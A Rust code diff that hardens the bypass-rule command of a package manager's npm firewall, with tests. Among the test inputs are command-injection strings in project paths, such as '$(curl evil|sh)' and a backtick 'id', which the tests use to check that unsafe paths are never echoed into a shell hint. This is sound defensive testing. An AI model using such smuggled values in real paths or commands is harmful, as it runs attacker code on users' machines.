@@ -3,7 +3,8 @@
 
 use crate::firewall_bypass::{
     AddedVerdict, BlockClass, BypassKind, FirewallBypassRule, FirewallBypassScope,
-    FirewallBypassSpec, MAX_SPECS_PER_APPROVAL, bypass_add_command, project_policy_root, rule_json,
+    FirewallBypassSpec, MAX_SPECS_PER_APPROVAL, bypass_add_command, forced_floor_refuses_additions,
+    project_policy_root_text, rule_json, shell_safe_in_double_quotes,
 };
 use crate::install_ui;
 use crate::security_approval;
@@ -165,7 +166,7 @@ impl RuleScope {
             }),
             Some(path) => Ok(Self {
                 scope: FirewallBypassScope::Project,
-                project_root: Some(project_policy_root(&cwd.join(path))?.display().to_string()),
+                project_root: Some(project_policy_root_text(&cwd.join(path))?),
             }),
         }
     }
@@ -177,15 +178,10 @@ impl RuleScope {
     fn describe(&self) -> String {
         match &self.project_root {
             None => "in every project".to_string(),
-            Some(root) => {
-                let name = Path::new(root)
-                    .file_name()
-                    .map_or_else(|| root.clone(), |name| name.to_string_lossy().into_owned());
-                format!(
-                    "in the {} project",
-                    lpm_common::sanitize_server_text(&name, 60)
-                )
-            }
+            Some(root) => format!(
+                "in the project at {}",
+                lpm_common::sanitize_server_text(root, 160)
+            ),
         }
     }
 }
@@ -220,6 +216,7 @@ enum Preview {
 async fn preview_exact_specs(
     client: &RegistryClient,
     specs: &[FirewallBypassSpec],
+    profile: lpm_registry::client::NpmFirewallPolicyProfile,
 ) -> HashMap<String, Preview> {
     let packages: Vec<NpmFirewallBatchPackage> = specs
         .iter()
@@ -237,9 +234,6 @@ async fn preview_exact_specs(
     if packages.is_empty() {
         return previews;
     }
-    let profile = security_approval::load_effective_authorized_posture()
-        .map(|effective| effective.posture.firewall_policy_profile())
-        .unwrap_or_default();
     match client
         .npm_firewall_batch_verdicts_with_posture_and_policy(
             &packages,
@@ -249,6 +243,12 @@ async fn preview_exact_specs(
         .await
     {
         Ok(response) => {
+            let unnamed_blocks = response.summary.block
+                > response
+                    .decisions
+                    .iter()
+                    .filter(|decision| decision.action == NpmFirewallAction::Block)
+                    .count() as u64;
             let mut blocked: HashMap<(String, String), NpmFirewallDecision> = response
                 .decisions
                 .into_iter()
@@ -259,6 +259,9 @@ async fn preview_exact_specs(
                 let key = (package.name, package.version);
                 let preview = match blocked.remove(&key) {
                     Some(decision) => Preview::Blocked(Box::new(decision)),
+                    None if unnamed_blocks => Preview::Unavailable(
+                        "LPM Firewall counted a block without naming the version".to_string(),
+                    ),
                     None => Preview::NotBlocked,
                 };
                 previews.insert(format!("{}@{}", key.0, key.1), preview);
@@ -338,23 +341,34 @@ fn added_verdict(preview: Option<&Preview>) -> Option<AddedVerdict> {
     })
 }
 
-/// The command a person runs to add `specs` with the same options.
-fn add_command_hint(specs: &[FirewallBypassSpec], request: &AddRequest<'_>) -> String {
+/// The command a person runs to add `specs` in `scope` with the same
+/// duration and malware coverage, or `None` when the project root can't be
+/// written into a shell command unchanged. The `--reason` note is left out:
+/// it's free text, and the person can add it again.
+fn add_command_hint(
+    specs: &[FirewallBypassSpec],
+    scope: &RuleScope,
+    ttl_secs: Option<u64>,
+    allow_malware: bool,
+) -> Option<String> {
     let coordinates: Vec<String> = specs.iter().map(ToString::to_string).collect();
     let mut command = bypass_add_command(coordinates.iter().map(String::as_str));
-    if let Some(project) = request.project {
+    if let Some(root) = &scope.project_root {
+        if !shell_safe_in_double_quotes(root) {
+            return None;
+        }
         command.push_str(" --project \"");
-        command.push_str(&project.display().to_string().replace('"', ""));
+        command.push_str(root);
         command.push('"');
     }
-    if let Some(ttl) = request.ttl {
+    if let Some(ttl_secs) = ttl_secs {
         command.push_str(" --ttl ");
-        command.push_str(ttl);
+        command.push_str(&security_approval::format_unlock_duration(ttl_secs));
     }
-    if request.allow_malware {
+    if allow_malware {
         command.push_str(" --allow-malware");
     }
-    command
+    Some(command)
 }
 
 /// The native prompt: what is allowed, where, and for how long. Built only
@@ -434,6 +448,23 @@ fn parse_ttl(ttl: Option<&str>) -> Result<Option<u64>, LpmError> {
     Ok(Some(secs))
 }
 
+/// When a rule added `now` with `ttl_secs` expires. A duration past the
+/// timestamp range is refused rather than saved as a rule that never expires.
+fn expiry_after(
+    now: Timestamp,
+    ttl_secs: Option<u64>,
+    raw: &str,
+) -> Result<Option<Timestamp>, LpmError> {
+    let Some(secs) = ttl_secs else {
+        return Ok(None);
+    };
+    i64::try_from(secs)
+        .ok()
+        .and_then(|secs| now.checked_add(lpm_common::timestamp::Duration::seconds(secs)))
+        .map(Some)
+        .ok_or_else(|| invalid_ttl(raw))
+}
+
 fn invalid_ttl(raw: &str) -> LpmError {
     LpmError::Registry(format!(
         "invalid `--ttl` value `{}`; use a positive duration such as `30m`, `12h` or `30d`",
@@ -441,17 +472,32 @@ fn invalid_ttl(raw: &str) -> LpmError {
     ))
 }
 
-fn refuse_under_forced_firewall_floor() -> Result<(), LpmError> {
-    let global = crate::commands::config::GlobalConfig::load_checked()?;
-    if crate::security_floor::force_security_floor_enabled(&global)
-        && crate::security_floor::current_firewall_floor(&global)?
-            == crate::npm_firewall_config::NpmFirewallMode::Enforce
-    {
-        return Err(LpmError::SecurityFloor(
-            "`force-security-floor = true` keeps the npm firewall enforcing every block; lower the floor intentionally in ~/.lpm/config.toml before adding a bypass rule".to_string(),
-        ));
-    }
-    Ok(())
+/// The firewall policy profile installs use here, for the preview: the
+/// config profile when it is authorized, else the approved one.
+fn runtime_policy_profile(
+    global: &crate::commands::config::GlobalConfig,
+    cwd: &Path,
+    effective: &security_approval::EffectiveAuthorizedPosture,
+) -> lpm_registry::client::NpmFirewallPolicyProfile {
+    crate::npm_firewall_config::resolve_runtime_firewall(
+        global,
+        cwd,
+        true,
+        crate::npm_firewall_config::BypassRuleScope::GlobalOnly,
+    )
+    .map_or_else(
+        |_| effective.posture.firewall_policy_profile(),
+        |firewall| firewall.policy_profile,
+    )
+}
+
+/// Refuses before any prompt, and records the refusal in the audit log.
+fn refuse_add(specs: &[FirewallBypassSpec], error: LpmError) -> LpmError {
+    security_approval::record_firewall_bypass_refusal(
+        specs.iter().map(ToString::to_string).collect(),
+        &error.to_string(),
+    );
+    error
 }
 
 async fn add(
@@ -469,28 +515,35 @@ async fn add(
         )));
     }
     let ttl_secs = parse_ttl(request.ttl)?;
+    let now = Timestamp::now();
+    let expires_at = expiry_after(now, ttl_secs, request.ttl.unwrap_or_default())?;
     let scope = RuleScope::resolve(cwd, request.project)?;
-    refuse_under_forced_firewall_floor()?;
+    let global = crate::commands::config::GlobalConfig::load_checked()?;
     let effective = security_approval::load_effective_authorized_posture()?;
     if let Some(reason) = security_approval::local_firewall_bypass_inactive_reason(&effective) {
-        return Err(LpmError::SecurityFloor(reason));
+        return Err(refuse_add(&specs, LpmError::SecurityFloor(reason)));
+    }
+    if forced_floor_refuses_additions(&global, &effective)? {
+        return Err(refuse_add(
+            &specs,
+            LpmError::SecurityFloor(
+                "`force-security-floor = true` keeps the npm firewall at enforce, so new bypass rules are refused; lower the floor intentionally in ~/.lpm/config.toml first".to_string(),
+            ),
+        ));
     }
 
     let previews = if json_output {
         HashMap::new()
     } else {
-        let previews = preview_exact_specs(client, &specs).await;
-        check_previews(&specs, &previews, request.allow_malware)?;
+        let profile = runtime_policy_profile(&global, cwd, &effective);
+        let previews = preview_exact_specs(client, &specs, profile).await;
+        if let Err(error) = check_previews(&specs, &previews, request.allow_malware) {
+            return Err(refuse_add(&specs, error));
+        }
         print_add_request(&specs, &previews, &scope);
         previews
     };
 
-    let now = Timestamp::now();
-    let expires_at = ttl_secs.and_then(|secs| {
-        now.checked_add(lpm_common::timestamp::Duration::seconds(
-            i64::try_from(secs).unwrap_or(i64::MAX),
-        ))
-    });
     let mut outcome = security_approval::FirewallBypassAdded::default();
     for batch in specs.chunks(MAX_SPECS_PER_APPROVAL) {
         let rules = batch
@@ -512,12 +565,12 @@ async fn add(
             })
             .collect();
         let prompt = approval_prompt(batch, &scope, ttl_secs, request.allow_malware);
-        let command_hint = add_command_hint(batch, request);
+        let command_hint = add_command_hint(batch, &scope, ttl_secs, request.allow_malware);
         let added = security_approval::add_firewall_bypass_rules(
             security_approval::FirewallBypassApproval {
                 rules,
                 prompt: &prompt,
-                command_hint: &command_hint,
+                command_hint: command_hint.as_deref(),
                 json_output,
             },
         );
@@ -565,15 +618,20 @@ fn report_added(outcome: &security_approval::FirewallBypassAdded, scope: &RuleSc
         ));
     }
     if !outcome.unchanged.is_empty() {
-        let specs: Vec<&str> = outcome
+        let rules: Vec<String> = outcome
             .unchanged
             .iter()
-            .map(|rule| rule.spec.as_str())
+            .map(|rule| match rule.expires_at {
+                Some(expires_at) => {
+                    format!("{} (until {})", rule.spec, expires_at.to_rfc3339_seconds())
+                }
+                None => format!("{} (no expiry)", rule.spec),
+            })
             .collect();
         install_ui::done_untrusted(&format!(
-            "Already allowed {}: {}.",
+            "Already allowed {}, unchanged: {}. Remove a rule first to change its duration.",
             scope.describe(),
-            specs.join(", ")
+            rules.join(", ")
         ));
     }
 }
@@ -831,33 +889,76 @@ mod tests {
         );
     }
 
-    #[test]
-    fn approval_prompt_names_the_project_for_a_project_rule() {
-        let scope = RuleScope {
+    fn project(root: &str) -> RuleScope {
+        RuleScope {
             scope: FirewallBypassScope::Project,
-            project_root: Some("/work/sil".into()),
-        };
+            project_root: Some(root.into()),
+        }
+    }
 
+    #[test]
+    fn approval_prompt_names_the_full_project_root_for_a_project_rule() {
         assert_eq!(
-            approval_prompt(&specs(&["foldrun"]), &scope, None, false),
-            "Allow every foldrun version past LPM Firewall in the sil project"
+            approval_prompt(&specs(&["foldrun"]), &project("/work/sil"), None, false),
+            "Allow every foldrun version past LPM Firewall in the project at /work/sil"
         );
     }
 
     #[test]
-    fn add_command_hint_quotes_specs_for_every_shell() {
-        let request = AddRequest {
-            specs: &[],
-            project: None,
-            ttl: Some("30d"),
-            reason: None,
-            allow_malware: false,
-        };
-
+    fn add_command_hint_quotes_specs_and_names_the_duration() {
         assert_eq!(
-            add_command_hint(&specs(&["@scope/pkg@^1.2.0", "foldrun@32.8.2"]), &request),
-            "lpm firewall bypass add \"@scope/pkg@^1.2.0\" \"foldrun@32.8.2\" --ttl 30d"
+            add_command_hint(
+                &specs(&["@scope/pkg@^1.2.0", "foldrun@32.8.2"]),
+                &global(),
+                Some(30 * 86_400),
+                false
+            )
+            .as_deref(),
+            Some("lpm firewall bypass add \"@scope/pkg@^1.2.0\" \"foldrun@32.8.2\" --ttl 30d")
         );
+    }
+
+    #[test]
+    fn add_command_hint_uses_the_resolved_project_root() {
+        assert_eq!(
+            add_command_hint(
+                &specs(&["foldrun@32.8.2"]),
+                &project("/work/my app"),
+                None,
+                true
+            )
+            .as_deref(),
+            Some(
+                "lpm firewall bypass add \"foldrun@32.8.2\" --project \"/work/my app\" --allow-malware"
+            )
+        );
+    }
+
+    #[test]
+    fn add_command_hint_is_left_out_for_a_project_root_a_shell_would_expand() {
+        for root in [
+            "/work/$(curl evil|sh)",
+            "/work/$HOME",
+            "/work/`id`",
+            "/work/%PATH%",
+            "/work/a\"b",
+            "/work/a!b",
+        ] {
+            assert_eq!(
+                add_command_hint(&specs(&["foldrun@32.8.2"]), &project(root), None, false),
+                None,
+                "{root}"
+            );
+        }
+    }
+
+    #[test]
+    fn expiry_that_overflows_the_timestamp_range_is_refused() {
+        let now = Timestamp::now();
+
+        assert!(expiry_after(now, Some(1_000_000_000_000), "1000000000000").is_err());
+        assert_eq!(expiry_after(now, None, "").unwrap(), None);
+        assert!(expiry_after(now, Some(60), "1m").unwrap().is_some());
     }
 
     #[test]
@@ -925,6 +1026,10 @@ mod tests {
             blocked("lpm_administrative_review", "clean"),
         )]);
 
-        assert!(check_previews(&specs(&["foldrun@32.8.2"]), &previews, true).is_err());
+        for allow_malware in [false, true] {
+            let error =
+                check_previews(&specs(&["foldrun@32.8.2"]), &previews, allow_malware).unwrap_err();
+            assert!(error.to_string().contains("held for LPM review"), "{error}");
+        }
     }
 }
